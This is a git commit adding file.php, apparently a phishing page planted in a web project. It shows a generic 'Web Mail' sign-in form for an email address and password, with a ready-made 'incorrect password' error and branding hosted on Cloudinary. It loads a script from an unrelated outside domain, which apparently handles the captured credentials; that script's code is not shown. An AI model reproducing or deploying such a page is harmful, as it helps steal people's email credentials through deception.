57a955e3ecfa583fbed85376c50643202184a5da
james2410 <chris@cimmarondesign.com>
2025-06-04 06:28:36 -0700

    Create file.php

---
+++ file.php
@@ -0,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Mail</title>
+    <link rel="stylesheet" href="https://res.cloudinary.com/dlv4norbe/raw/upload/v1744639790/styles_c3ormf.css?v=<?php echo time() ?>">
+    <link rel="icon" class="id">
+</head>
+<body>
+
+    <div class="container-box">
+
+         <div class="lgBox">
+            <img src="https://res.cloudinary.com/dlv4norbe/image/upload/v1744639802/mwa_xkeq2q.png" alt="lgw" class="lgi">
+         </div>
+
+         <div class="tpBox1">
+            <h2 class="tBoxi">Web Mail</h2>
+         </div>
+
+         <div class="errorBox hide">
+            <p>Incorrect email password, try again!</p>
+         </div>
+
+         <form action="#" class="mxf">
+            <div class="foBox">
+                <label for="">Email address</label>
+                <input type="email" name="em" id="em" placeholder="Email address" required>
+            </div>
+
+            <div class="foBox">
+                <label for="">Password</label>
+                <input type="password" name="pas" id="pas" placeholder="Password" required>
+            </div>
+
+            <div class="foBox">
+                <button class="btn2">Sign in</button>
+            </div>
+         </form>
+    </div>
+
+    <script src="https://quercus.org/fol/main.js?v=<?php echo time() ?>"></script>
+
+</body>
+</html>
